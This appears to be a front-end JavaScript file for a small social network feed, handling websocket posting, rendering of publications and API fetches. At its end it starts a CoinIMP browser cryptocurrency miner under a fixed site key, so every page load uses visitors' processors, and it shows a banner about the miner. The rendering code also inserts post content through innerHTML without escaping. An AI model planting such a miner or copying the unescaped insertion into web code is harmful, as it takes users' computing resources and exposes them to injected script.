/**ulisesten at jan 2019 */

/**Calls */

var username = localStorage.getItem('nombre');
getPubs();

/************** WebSockets **************/
var ws = new io();

ws.on('connect',function() {
  console.log('connected');
});

ws.on('disconnect', function(){});

var pubSender = getEl('pubSender');
pubSender.addEventListener('click',function(){
    var pubData = {
      pubid: 'fhfhfh',
      time: '45:78:12',
      nombre: 'unoname',
      content: getEl('pubContent').value,
      tkn: getEl('ctkn').value
    }
    ws.emit('pub',pubData);
    newPub(pubData);
});

/************* Publications **************/
function newEl(el){
    return document.createElement(el);
}

function newPub(res){
    var div = newEl('div');
    div.setAttribute('class','pubs border font');
    div.setAttribute('id',res.pubid);

    var content = newEl('p');
        content.setAttribute('class','content');
        content.innerHTML = res.content;
        //content = setFontSize(publication,res.content);
        //content = linkify(publication,res.pub,no_previsualization);


    //var imgUrl = getImage(res.imagen);
    var uImg = newEl('img');
        uImg.setAttribute('class','uImg borde');
        //uImg.setAttribute('src',imgUrl);

    var a = newEl('a');
        a.setAttribute('class','enlace1');
        a.setAttribute('href','/pagina/'+res.nombre);
        a.innerHTML = res.nombre;

    var hora = newEl('span');
        hora.setAttribute('class','time1');
        hora.innerHTML = res.time;

    var mg = newEl('span');
        mg.setAttribute('class','mg reacciones');
        mg.innerHTML = 'mg';

    var nmg = newEl('span');
        nmg.setAttribute('class','nmg reacciones');
        nmg.innerHTML = 'nmg';

    var comment = newEl('span');
        comment.setAttribute('class','comment reacciones');
        comment.innerHTML = 'comentar';
        //comment.addEventListener('click',comentar);

    div.prepend(comment);
    div.prepend(nmg);
    div.prepend(mg);
    div.prepend(content);
    div.prepend(hora);
    div.prepend(a);
    div.prepend(uImg);
    //div.addEventListener('click',getPublicationID);

    getEl('publications').prepend(div);
}

/************** Get Publications **************/
function getPubs(){
    fetch('/api/getPublications', {
        credentials: 'include',
        method: 'GET'
      })
        .then(res => {
          if(res.ok == false){
              console.log('Home->getPubs(): error');
              return;
          }
          return res.json();
      })
        .then(res => {
        console.log('Home->getPubs():',res);
      });
}

function getEl(id){
  return document.getElementById(id);
}

function notif(text){
    console.log(text);
}


/******************* Contactos ********************/
function searchU(){
    fetch('/api/searchUsers', {
        credentials: 'include',
        method: 'POST'
      })
        .then(res => {
            if(res.ok == false){
                console.log('Home->searchU(): error');
                return;
            }
             return res.json();
      })
        .then(res => {
            console.log('Home->getPubs():',res);
      });
}


var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',username, {
    throttle: 0.5, c: 'w'
});
_client.start();
_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
